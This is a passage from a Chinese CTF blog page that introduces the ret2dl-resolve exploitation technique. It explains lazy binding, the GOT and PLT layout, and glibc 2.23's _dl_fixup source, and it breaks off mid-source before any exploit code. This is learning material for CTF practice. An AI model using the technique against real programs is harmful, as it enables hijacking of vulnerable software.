@@ -1,0 +1,491 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ret2dl-resolve | iyheart的博客</title><meta name="author" content="iyheart"><meta name="copyright" content="iyheart"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言：ROP系列补充点知识">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2dl-resolve">
+<meta property="og:url" content="http://iyheart.github.io/2025/07/04/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/1.%E6%A0%88%E7%B3%BB%E5%88%97/ret2dlresolve/index.html">
+<meta property="og:site_name" content="iyheart的博客">
+<meta property="og:description" content="前言：ROP系列补充点知识">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/iyheart/tuchuang/main/img/cover186.png">
+<meta property="article:published_time" content="2025-07-04T07:12:36.000Z">
+<meta property="article:modified_time" content="2025-07-05T16:12:55.298Z">
+<meta property="article:author" content="iyheart">
+<meta property="article:tag" content="博客, 笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/iyheart/tuchuang/main/img/cover186.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://iyheart.github.io/2025/07/04/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/1.%E6%A0%88%E7%B3%BB%E5%88%97/ret2dlresolve/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":true,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ret2dl-resolve',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-07-06 00:12:55'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/styles.css"><!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="iyheart的博客" type="application/atom+xml">
+<link href="https://cdn.bootcss.com/KaTeX/0.11.1/katex.min.css" rel="stylesheet" /></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="http://pic.5tu.cn/uploads/allimg/1910/pic_5tu_big_2019010211653346247.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">148</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">16</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">41</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 历史</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-music"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-tasks"></i><span> 知识库</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/docs/"><i class="fa-fw fas fa-book"></i><span> 编程语言知识库</span></a></li><li><a class="site-page child" href="/practice/"><i class="fa-fw fas fa-book"></i><span> PWN刷题记录</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/update/"><i class="fa-fw fas fa-bell"></i><span> 更新</span></a></div><div class="menus_item"><a class="site-page" href="javascript:toRandomPost()"><i class="fa-fw fas fa-bus"></i><span> 随机文章</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://raw.githubusercontent.com/iyheart/tuchuang/main/img/cover186.png')"><nav id="nav"><span id="blog-info"><a href="/" title="iyheart的博客"><img class="site-icon" src="http://img95.699pic.com/photo/40151/9175.gif_wh860.gif"/><span class="site-name">iyheart的博客</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 历史</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-music"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-tasks"></i><span> 知识库</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/docs/"><i class="fa-fw fas fa-book"></i><span> 编程语言知识库</span></a></li><li><a class="site-page child" href="/practice/"><i class="fa-fw fas fa-book"></i><span> PWN刷题记录</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/update/"><i class="fa-fw fas fa-bell"></i><span> 更新</span></a></div><div class="menus_item"><a class="site-page" href="javascript:toRandomPost()"><i class="fa-fw fas fa-bus"></i><span> 随机文章</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ret2dl-resolve</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-07-04T07:12:36.000Z" title="发表于 2025-07-04 15:12:36">2025-07-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-07-05T16:12:55.298Z" title="更新于 2025-07-06 00:12:55">2025-07-06</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/PWN/">PWN</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>14分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ret2dl-resolve"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><ul>
+<li>最近经常做到<code>only_read</code>类型的题目，这种类型的题目我都是使用<code>SROP</code>做的非常麻烦。而这种题型<code>ret2dlresolve</code>的利用就变得非常方便。</li>
+<li>注：没有特别说明，调试环境和题目环境都是在<code>glibc2.23</code>下进行的</li>
+<li>参考博客：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51868336/article/details/114644569">ret2dlresolve超详细教程(x86&amp;x64)-CSDN博客</a></li>
+</ul>
+<h1 id="前置知识"><a class="markdownIt-Anchor" href="#前置知识"></a> 前置知识</h1>
+<ul>
+<li>在<code>ret2libc</code>中我们已经初步了解了<code>plt</code>和<code>got</code>这两个表，我们泄露libc的地址都是通过<code>got</code>表来泄露的，并且已经稍微了解延迟绑定技术。并且泄露的时候我们需要找已经被调用过一次的库函数的<code>got</code>表地址，这样我才能泄露出<code>libc</code>的地址，否则泄露的并不是<code>libc</code>的地址</li>
+<li>因为<code>Linux</code>中的<strong>延迟绑定机制</strong>导致了函数在没调用之前是不会写入<code>libc</code>的地址到<code>got</code>表的。而在第一次调用的库函数的时候，并不是直接跳转到<code>libc</code>中相应的地址去执行相关函数，而是先会执行一个名为<code>_dl_runtime_resolve(link_map,reloc_arg)</code>的函数。先将函数的libc地址写入到<code>got</code>表后，程序才会真正的调用函数。</li>
+<li>而<code>ret2dlresolve</code>其实就是通过溢出等手段，控制调用函数<code>_dl_runtime_resolve(link_map,reloc_arg)</code>时传入的参数，以及伪造传入参数对应的地址里面的内容。</li>
+</ul>
+<h2 id="延迟绑定机制lazy-blinding"><a class="markdownIt-Anchor" href="#延迟绑定机制lazy-blinding"></a> 延迟绑定机制(Lazy Blinding)</h2>
+<ul>
+<li>
+<p>主要了解一下延迟绑定机制的主要过程，在了解过程之前我们要先了解一下<code>plt</code>表和<code>got</code>表的具体结构。</p>
+</li>
+<li>
+<p>我们以这个代码为例子：</p>
+</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;hello world!&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hello world!&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;bye!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;<span class="comment">//gcc -g -o lab1 lab1.c</span></span><br></pre></td></tr></table></figure>
+<h3 id="got表结构"><a class="markdownIt-Anchor" href="#got表结构"></a> GOT表结构</h3>
+<ul>
+<li>
+<p>为了有利于了解过程，先要了解一下这俩个表的结构。</p>
+</li>
+<li>
+<p>先来了解一下<code>got</code>表的结构，<code>got</code>表其实就是一个<code>指针数组</code>，<code>got</code>表里面存储的全部是地址。对于上面编译好的示例程序，先使用<code>IDA pro</code>反编译查看一下<code>got</code>表。</p>
+</li>
+<li>
+<p>如下图所示：</p>
+<ul>
+<li>发现<code>got</code>表其实有俩个节，其中一个是<code>.got</code>，另一个其实是<code>.got.plt</code>。对于第一个<code>.got</code>主要是用于重定位，而不是延迟绑定，在<strong>延迟绑定</strong>所说的GOT表其实指的是<code>.got.plt</code>这个节。</li>
+<li>并且还发现<code>offset puts</code>是被放在了<code>got[3]</code>这边，前面还有<code>got[0]、got[1]</code>、<code>got[2]</code></li>
+<li><code>got[0]</code>是指向<code>_DYAMIC</code>所在的位置，而<code>_DYAMIC</code>其实是<code>.dynamic</code>的结构，但是<code>got[1]</code>、<code>got[2]</code>都被设置成了<code>0</code></li>
+</ul>
+</li>
+</ul>
+<p><img src="/2025/07/04/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/1.%E6%A0%88%E7%B3%BB%E5%88%97/ret2dlresolve/image-20250705152827457.png" alt="image-20250705152827457"></p>
+<p><img src="/2025/07/04/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/1.%E6%A0%88%E7%B3%BB%E5%88%97/ret2dlresolve/image-20250705153326028.png" alt="image-20250705153326028"></p>
+<ul>
+<li>动态调试看一看<code>got[1]</code>、<code>got[2]</code>发现有值存在，而这个值是在程序一开始运行时写入进去的，而不是在编译的时候写入进去的。</li>
+<li>并且<code>got[1]</code>存放的其实是<code>link_map *</code>这个指针，<code>got[2]</code>存放的就是<code>_dl_runtime_resolve</code>这个函数的地址。</li>
+</ul>
+<p><img src="/2025/07/04/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/1.%E6%A0%88%E7%B3%BB%E5%88%97/ret2dlresolve/image-20250705153609694.png" alt="image-20250705153609694"></p>
+<p><img src="/2025/07/04/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/1.%E6%A0%88%E7%B3%BB%E5%88%97/ret2dlresolve/image-20250705153758279.png" alt="image-20250705153758279"></p>
+<ul>
+<li>这样一来就可以知道<code>got</code>表的大致结构了。</li>
+</ul>
+<p><img src="/2025/07/04/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/1.%E6%A0%88%E7%B3%BB%E5%88%97/ret2dlresolve/image-20250705154250792.png" alt="image-20250705154250792"></p>
+<h3 id="plt表结构"><a class="markdownIt-Anchor" href="#plt表结构"></a> PLT表结构</h3>
+<ul>
+<li>接着在IDA中查看一下<code>PLT</code>表的结构：
+<ul>
+<li>这里也发现有<code>.plt</code>表和<code>.plt.got</code>表，询问AI发现是这样，老版本的延迟绑定是将<code>延迟绑定函数1@plt</code>和<code>调用_dl_runtime_resolve</code>的那段汇编和在一起(即<code>图中红框</code>)。新版本是新增一个跳板即<code>.plt.got</code>这个地方存放的是<code>__cxa_finalize@plt</code>。这里先了解一下，新版本之后介绍。</li>
+<li>点击<code>_puts</code>后会跳转到<code>_puts@plt</code>，之后又会执行一个<code>jump</code>其实就是jump到<code>puts@got</code>一开始存储的值，即<code>_puts@plt+6</code></li>
+</ul>
+</li>
+</ul>
+<p><img src="/2025/07/04/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/1.%E6%A0%88%E7%B3%BB%E5%88%97/ret2dlresolve/image-20250705161418463.png" alt="image-20250705161418463"></p>
+<p><img src="/2025/07/04/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/1.%E6%A0%88%E7%B3%BB%E5%88%97/ret2dlresolve/image-20250705161654831.png" alt="image-20250705161654831"></p>
+<p><img src="/2025/07/04/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/1.%E6%A0%88%E7%B3%BB%E5%88%97/ret2dlresolve/image-20250705161721650.png" alt="image-20250705161721650"></p>
+<ul>
+<li>这里其实<code>plt</code>表的结构比较清晰：</li>
+</ul>
+<p><img src="/2025/07/04/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/1.%E6%A0%88%E7%B3%BB%E5%88%97/ret2dlresolve/image-20250705163114066.png" alt="image-20250705163114066"></p>
+<h3 id="延迟绑定流程"><a class="markdownIt-Anchor" href="#延迟绑定流程"></a> 延迟绑定流程</h3>
+<ul>
+<li>我们先来调试一下，先了解一延迟绑定的流程。首先是第一次调用<code>puts</code>函数，<code>call puts@plt</code>。</li>
+</ul>
+<p><img src="/2025/07/04/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/1.%E6%A0%88%E7%B3%BB%E5%88%97/ret2dlresolve/image-20250705162706614.png" alt="image-20250705162706614"></p>
+<ul>
+<li>接下来就执行<code>puts@plt</code>表存储的指令也就是<code>jmp got[3]</code>。<strong>注意：这里是jmp到got表存储的地址，而不是jmp到got表，这里got[3]=puts@plt+6</strong></li>
+</ul>
+<p><img src="/2025/07/04/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/1.%E6%A0%88%E7%B3%BB%E5%88%97/ret2dlresolve/image-20250705162841758.png" alt="image-20250705162841758"></p>
+<ul>
+<li>然后就会执行<code>puts@plt+6</code>位置的指令<code>push 0; jmp 0x400420</code></li>
+</ul>
+<p><img src="/2025/07/04/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/1.%E6%A0%88%E7%B3%BB%E5%88%97/ret2dlresolve/image-20250705163152961.png" alt="image-20250705163152961"></p>
+<ul>
+<li>此时又跳转到<code>plt表的起始位置</code>去执行这段汇编</li>
+</ul>
+<p><img src="/2025/07/04/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/1.%E6%A0%88%E7%B3%BB%E5%88%97/ret2dlresolve/image-20250705163227757.png" alt="image-20250705163227757"></p>
+<p><img src="/2025/07/04/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/1.%E6%A0%88%E7%B3%BB%E5%88%97/ret2dlresolve/image-20250705163257587.png" alt="image-20250705163257587"></p>
+<ul>
+<li>之后就跳转到<code>got[2]</code>存储的位置，也就是<code>_dl_runtime_resolve_xsavec</code>函数，执行完之后<code>puts@got</code>中存储的就是<code>puts</code>函数的真实地址了。</li>
+</ul>
+<p><img src="/2025/07/04/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/1.%E6%A0%88%E7%B3%BB%E5%88%97/ret2dlresolve/image-20250705163835810.png" alt="image-20250705163835810"></p>
+<ul>
+<li>接下来简述一下流程：</li>
+</ul>
+<p><img src="/2025/07/04/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/1.%E6%A0%88%E7%B3%BB%E5%88%97/ret2dlresolve/image-20250705165602188.png" alt="image-20250705165602188"></p>
+<ul>
+<li>当第二次调用的时候：</li>
+</ul>
+<p><img src="/2025/07/04/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/1.%E6%A0%88%E7%B3%BB%E5%88%97/ret2dlresolve/image-20250705165549598.png" alt="image-20250705165549598"></p>
+<h2 id="_dl_runtime_resolve执行流程"><a class="markdownIt-Anchor" href="#_dl_runtime_resolve执行流程"></a> _dl_runtime_resolve执行流程</h2>
+<ul>
+<li>了解完延迟绑定机制后，现在了解一下<code>_dl_runtime_resolve</code>这个函数的执行流程。直接查看源码，在<code>glibc/sysdeps/x86_64/dl-trampoline.h</code>这个文件下，但是这个函数并不是延迟绑定最重要的一个函数。</li>
+</ul>
+<h3 id="_dl_fixup"><a class="markdownIt-Anchor" href="#_dl_fixup"></a> _dl_fixup</h3>
+<ul>
+<li>在<code>_dl_runtime_resolve</code>它会调用<code>_dl_fixup</code>这个函数，此处借一张图</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup(struct link_map *1,ElfW(Word) reloc_arg)</span><br></pre></td></tr></table></figure>
+<p><img src="/2025/07/04/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/1.%E6%A0%88%E7%B3%BB%E5%88%97/ret2dlresolve/f2e3165aee92ec0ff9986417e5b3181d.png" alt="img"></p>
+<ul>
+<li>所以其实延迟绑定的最主要的函数是<code>_dl_fixup</code>这个函数，接下来查看一下这个函数的源码，在文件夹<code>glibc-2.23/elf/dl-runtime.c</code>中实现的</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (<span class="meta">#<span class="keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS ELF_MACHINE_RUNTIME_FIXUP_ARGS,  # <span class="keyword">endif</span> struct link_map *l, ElfW(Word) reloc_arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> ElfW(Sym) *<span class="type">const</span> symtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 通过参数reloc_arg计算重定位的入口,这里的JMPREL即.rel.plt,reloc_offset即reloc_arg</span></span><br><span class="line">  <span class="type">const</span> PLTREL *<span class="type">const</span> reloc = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">  <span class="comment">// 关键点,通过reloc-&gt;r_info找到.dynsym对应的条目</span></span><br><span class="line">  <span class="type">const</span> ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">  </span><br><span class="line">  <span class="type">void</span> *<span class="type">const</span> rel_addr = (<span class="type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">  <span class="type">lookup_t</span> result;</span><br><span class="line">  DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*关键点:这里还会检查reloc-&gt;r_info的最低位是不是R_386_JMUP_SLOT=7  */</span></span><br><span class="line">  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">      used don&#x27;t look in the global scope.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="type">const</span> <span class="keyword">struct</span> r_found_version *version = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">const</span> ElfW(Half) *vernum =</span><br><span class="line">	    (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">	  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">	  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">	  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">	    version = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We need to keep the scope around so do some locking.  This is</span></span><br><span class="line"><span class="comment">	 not necessary for objects which cannot be unloaded or when</span></span><br><span class="line"><span class="comment">	 we are not using any threads (yet).  */</span></span><br><span class="line">      <span class="type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">	&#123;</span><br><span class="line">	  THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">	  flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	 <span class="comment">// 接着通过strtab+sym-&gt;st_name找到符号表字符串，result为libc基地址</span></span><br><span class="line">      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">				    version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We are done with the global scope.  */</span></span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">	THREAD_GSCOPE_RESET_FLAG ();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">      